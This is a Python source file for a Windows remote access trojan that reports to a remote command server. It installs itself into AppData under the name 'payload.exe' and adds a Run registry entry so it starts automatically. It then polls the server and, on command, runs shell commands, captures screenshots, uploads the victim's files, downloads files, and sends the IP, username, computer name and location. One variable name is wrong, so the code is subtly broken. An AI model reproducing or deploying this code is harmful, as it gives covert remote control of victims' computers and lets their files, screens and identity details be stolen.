import requests, _winreg, os
from time import strftime, gmtime, sleep
from base64 import b64encode
from shutil import copyfile
from json import loads
from sys import argv
from mss import mss

# config vars
server_address = 'http://cyberazor.altervista.org/PythonRAT/api.php'
file_name = 'payload.exe'
path = os.getenv('appdata')
file_path = path + filename
application_path = argv[0]

# HTTP GET request
def get_req(url):
	try:
		r = requests.get(url, stream = True)
		r.raise_for_status()
	except requests.exceptions.RequestException:
		sleep(2)
		return get_req(url)
	return r

# HTTP POST request
def post_req(url, par):
	try:
		if not par:
			r = requests.post(url)
		else:
			r = requests.post(url, data = par)
		r.raise_for_status()
	except requests.exceptions.RequestException:
		sleep(2)
		return post_req(url, par)
	return r

# HTTP POST request with file submit
def post_file(url, par, filedata):
	try:
		r = requests.post(url, par, files = {'file' : filedata})
		r.raise_for_status()
	except requests.exceptions.RequestException:
		sleep(2)
		return post_file(url, par, filedata)
	return r

# if first time executing, copy itself to appdata and add autostart registry entry
if not os.path.isfile(file_path):
	copyfile(application_path, file_path)
	with _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, _winreg.KEY_SET_VALUE) as key:
		if '%' in file_path:
			var_type = _winreg.REG_EXPAND_SZ
		else:
			var_type = _winreg.REG_SZ
		_winreg.SetValueEx(key, file_name.split('.', 1)[0], 0, var_type, file_path)

# if executable not in its default path, replace process with the one stored there
if application_path != file_path:
	os.execl(file_path, '"' + file_path + '"')

while True:
	try:
		
		# wait for commands
		com = get_req(server_address + '?getcmd=1')
		while com.text == 'OK':
			sleep(1)
			com = get_req(server_address + '?getcmd=1')
		
		# parse command
		command = loads(com.text)
		server_resp = server_address + '?respcmd=' + command[0]
		
		# detailed status, response: if online -> public IP, username, computer name, system time, location
		if command[0] == 'status':
			# get public IP and location using ipinfo API
			ip = ''.join(get_req('http://ipinfo.io/ip').text.split('\n'))
			geo = loads(get_req('http://ipinfo.io/' + ip + '/geo'))
			status = {
				'ip' : ip,
				'username' : os.getenv('username'),
				'computername' : os.getenv('computername'),
				'time' : strftime("%Y-%m-%d %H:%M:%S", gmtime()),
				'location' : geo['city'] + ', ' + geo['region'] + ', ' + geo['country']
			}
			post_req(server_resp, status)
		
		# execute shell command, response: command output
		elif command[0] == 'shell':
			post_req(server_resp, {'response' : os.popen(command[1]).read()})
		
		# get a screenshot, response: screenshot png file and current time
		elif command[0] == 'screenshot':
			mss().shot(mon = -1, output = 'scr.png')
			with open('scr.png', 'rb') as scr_file:
				post_file(server_resp, {'response' : 'scr.png', 'time' : strftime("%Y-%m-%d %H:%M:%S", gmtime())}, scr_file)
			os.remove('scr.png')
		
		# get a file from target, response: requested file
		elif command[0] == 'getfile':
			filepath_get = ' '.join(command[1].split('[SPACE]'))
			if os.path.isfile(filepath_get):
				filename_get = filepath_get.split('\\')[-1]
				with open(filepath_get, 'rb') as fileget:
					post_file(server_resp, {'response' : filename_get}, fileget)
			else:
				post_req(server_resp, {'response' : 'Error: file not found'})
		
		# sendfile command, detected by content-type header, response: file transfer status
		elif com.headers['Content-Type'] == 'application/force-download':
			# getting filename through another GET request to server
			filename = get_req(server_address + '?getfilename=1').text
			filename = ' '.join(filename.split('[SPACE]'))
			total_length = int(com.headers['Content-Length'])
			with open(filename, 'wb') as file_save:
				for chunk in com.iter_content(chunk_size = 4096):
					if chunk:
						file_save.write(chunk)
			# if filesize matches with content-length header, download successful
			if os.path.isfile(filename) and os.path.getsize(filename) == total_length:
				post_req(server_resp, {'response' : 'Received ' + filename})
			else:
				post_req(server_resp, {'response' : 'Error: file ' + filename + ' not downloaded correctly'})
		
		# invalid command
		else:
			post_req(server_resp, {'response' : 'Error: invalid command'})
		
		# sleep to reduce CPU usage
		sleep(2)
	
	# when exception encountered re-execute itself
	except:
		os.execl(application_path, '"' + application_path + '"')
